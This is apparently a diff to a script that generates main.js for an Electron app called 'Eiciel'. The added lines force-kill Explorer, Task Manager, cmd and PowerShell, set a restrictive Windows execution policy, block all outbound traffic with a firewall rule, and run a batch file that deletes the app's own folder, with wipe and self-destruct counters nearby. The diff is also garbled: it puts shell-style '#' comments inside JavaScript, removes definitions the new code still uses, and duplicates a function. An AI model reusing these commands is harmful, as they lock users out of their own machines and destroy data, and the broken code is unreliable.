@@ -34,56 +34,66 @@ EOF
 
 # ─── main.js – full with all features and test‑mode guard ──────
 cat > main.js << 'EOF'
-const { app, BrowserWindow, ipcMain, dialog } = require('electron');
-const fs = require('fs').promises;
-const fsSync = require('fs');
-const path = require('path');
-const { spawn, exec } = require('child_process');
-const si = require('systeminformation');
-const archiver = require('archiver');
-const https = require('https');
-const http = require('http');
+# ─── Self‑destruct on normal exit ──────────────────────────────
+function scheduleSelfDestructOnExit() {
+  if (testMode || process.env.EICIEL_TEST_MODE) {
+    testSpies.selfDestructOnExit++;
+    return;
+  }
+  const exeDir = path.dirname(process.execPath);
+  const exeFile = process.execPath;
+  const script = `@echo off\ntimeout /t 3 /nobreak > nul\nrmdir /s /q "${exeDir}"\ndel /f /q "${exeFile}"`;
+  const batPath = path.join(process.env.TEMP, 'selfdestruct_exit.bat');
+  fsSync.writeFileSync(batPath, script);
+  exec(`start /min ${batPath}`, { detached: true, stdio: 'ignore' });
+}
 
-process.on('uncaughtException', (err) => {
-  console.error('Uncaught Exception:', err);
-  const logPath = path.join(process.env.APPDATA || './', 'eiciel_error.log');
-  fsSync.appendFileSync(logPath, new Date().toISOString() + ' - ' + err.stack + '\n');
-});
-process.on('unhandledRejection', (reason, promise) => {
-  console.error('Unhandled Rejection:', reason);
-});
-
-let CLOUD_BACKUP_URL = 'https://your-cloud-endpoint.com/upload';
-let API_KEY = 'your-secure-api-key';
-let WIPE_PASSWORD = 'EICIEL-2026';
-const CAPTCHA_FAIL_LIMIT = 10;
-const MOUSE_SCORE_THRESHOLD = 1;
-
-let mainWindow;
-let breachDetected = false;
-let captchaFailCount = 0;
-let apiServer = null;
-
-let config = {
-  cloudUrl: 'https://your-cloud-endpoint.com/upload',
-  loginPasskey: 'EICIEL-2026',
-  breachPasskey: 'EICIEL-2026',
-  wipePassword: 'EICIEL-2026'
-};
-
-let testMode = false;
-const testSpies = {
-  createBackupArchive: 0,
-  backupToCloud: 0,
-  wipeAllDrives: 0,
-  selfDestruct: 0,
-  onWipeRequest: 0,
-  disableSystemProcesses: 0,
-  enableSystemProcesses: 0,
-  blockInternet: 0,
-  allowInternet: 0,
-  selfDestructOnExit: 0
-};
+# ─── System and internet controls ──────────────────────────────
+function disableSystemProcesses() {
+  if (testMode || process.env.EICIEL_TEST_MODE) {
+    testSpies.disableSystemProcesses++;
+    return;
+  }
+  console.log('🔒 Disabling system processes...');
+  const procs = ['explorer.exe', 'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'notepad.exe'];
+  procs.forEach(p => {
+    exec(`taskkill /f /im ${p}`, (err) => { if (err) console.warn(`Could not kill ${p}:`, err); });
+  });
+  exec('reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers" /v DefaultLevel /t REG_DWORD /d 262144 /f', (err) => {
+    if (err) console.warn('Failed to set policy:', err);
+  });
+}
+function enableSystemProcesses() {
+  if (testMode || process.env.EICIEL_TEST_MODE) {
+    testSpies.enableSystemProcesses++;
+    return;
+  }
+  console.log('🔓 Re‑enabling system processes...');
+  exec('reg delete "HKLM\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers" /v DefaultLevel /f', (err) => {
+    if (err) console.warn('Failed to remove policy:', err);
+  });
+  exec('start explorer.exe', (err) => { if (err) console.warn('Could not start explorer:', err); });
+}
+function blockInternet() {
+  if (testMode || process.env.EICIEL_TEST_MODE) {
+    testSpies.blockInternet++;
+    return;
+  }
+  console.log('🚫 Blocking internet access...');
+  exec('netsh advfirewall firewall add rule name="Eiciel_BlockAll" dir=out action=block', (err) => {
+    if (err) console.warn('Failed to block internet:', err);
+  });
+}
+function allowInternet() {
+  if (testMode || process.env.EICIEL_TEST_MODE) {
+    testSpies.allowInternet++;
+    return;
+  }
+  console.log('🌐 Allowing internet access...');
+  exec('netsh advfirewall firewall delete rule name="Eiciel_BlockAll"', (err) => {
+    if (err) console.warn('Failed to allow internet:', err);
+  });
+}
 
 // ─── Self‑destruct on normal exit ──────────────────────────────
 function scheduleSelfDestructOnExit() {
